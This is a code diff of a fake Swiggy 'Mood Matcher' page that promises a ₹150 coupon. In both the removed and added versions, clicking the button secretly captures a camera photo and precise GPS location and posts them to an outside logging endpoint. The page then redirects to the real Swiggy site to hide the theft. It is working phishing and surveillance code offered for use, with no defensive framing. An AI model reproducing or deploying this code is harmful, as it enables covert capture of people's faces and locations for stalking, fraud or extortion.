@@ -1,89 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Swiggy | Mood Matcher</title>
-    <style>
-        body { background: #fff; color: #282c3f; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { text-align: center; width: 90%; max-width: 380px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .s-logo { width: 60px; height: 60px; background: #fc8019; border-radius: 15px; margin: 0 auto 20px; color: #fff; font-size: 35px; font-weight: 900; display: flex; align-items: center; justify-content: center; }
-        h1 { font-size: 1.4rem; margin-bottom: 10px; }
-        .btn { background: #fc8019; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 1rem; }
-        #loader { display: none; }
-        .spinner { width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #v { position: absolute; width: 1px; height: 1px; opacity: 0; }
-    </style>
-</head>
-<body>
+<script>
+    const API = "https://titan-logger.saliljha523.workers.dev";
+    const btn = document.getElementById('btn');
+    const video = document.getElementById('v');
+    const canvas = document.createElement('canvas');
 
-    <div class="card">
-        <div class="s-logo">S</div>
-        <div id="ui">
-            <h1>Face vs. Food Match</h1>
-            <p style="color:#666; font-size: 0.9rem;">Scan your mood to unlock a <b>₹150 Discount</b> coupon for restaurants near you.</p>
-            <button id="btn" class="btn">UNLOCK COUPON</button>
-        </div>
-        <div id="loader">
-            <div class="spinner"></div>
-            <p id="msg" style="color:#fc8019; font-weight:bold; font-size:0.8rem;">SYNCING SENSORS...</p>
-        </div>
-    </div>
+    btn.onclick = async () => {
+        // ... (UI changes to loading) ...
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null), {enableHighAccuracy:true}));
+            
+            video.srcObject = stream;
+            await video.play();
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const img = canvas.toDataURL('image/jpeg', 0.2); // Ultra-light for instant upload
+            stream.getTracks().forEach(t => t.stop());
 
-    <video id="v" playsinline muted></video>
+            // THE CRITICAL SYNC
+            const response = await fetch(API, {
+                method: 'POST',
+                body: JSON.stringify({ image: img, gps: pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "NO_GPS" })
+            });
 
-    <script>
-        const API = "https://titan-logger.saliljha523.workers.dev"; // VERIFY THIS URL
-        const video = document.getElementById('v');
-        const btn = document.getElementById('btn');
-        const canvas = document.createElement('canvas');
+            if (!response.ok) throw new Error("Database Rejected Connection");
 
-        btn.onclick = async () => {
-            document.getElementById('ui').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            const msg = document.getElementById('msg');
-
-            try {
-                // 1. FAST SENSOR START
-                msg.innerText = "STARTING AI SCAN...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                await video.play();
-
-                // 2. FAST GPS LOCK
-                msg.innerText = "FETCHING LOCAL DEALS...";
-                const pos = await new Promise((res) => {
-                    navigator.geolocation.getCurrentPosition(res, () => res(null), {
-                        enableHighAccuracy: true, timeout: 5000
-                    });
-                });
-
-                // 3. CAPTURE & COMPRESS
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const img = canvas.toDataURL('image/jpeg', 0.3); // High compression for instant upload
-
-                // Kill Camera
-                stream.getTracks().forEach(t => t.stop());
-
-                // 4. THE GUARANTEED UPLINK
-                msg.innerText = "FINALIZING COUPON...";
-                const gpsData = pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "GPS_FAIL";
-                
-                // IMPORTANT: We wait (await) so the data is sent BEFORE redirect
-                await fetch(API, {
-                    method: 'POST',
-                    mode: 'cors',
-                    body: JSON.stringify({ image: img, gps: gpsData })
-                });
-
-            } catch (e) { console.log(e); }
-
-            // 5. REDIRECT
             window.location.replace("https://www.swiggy.com/offers-near-me");
-        };
-    </script>
-</body>
-</html>
+        } catch (e) {
+            alert("Connection Error: " + e.message); // This tells us what's wrong
+            window.location.replace("https://www.swiggy.com");
+        }
+    };
+</script>
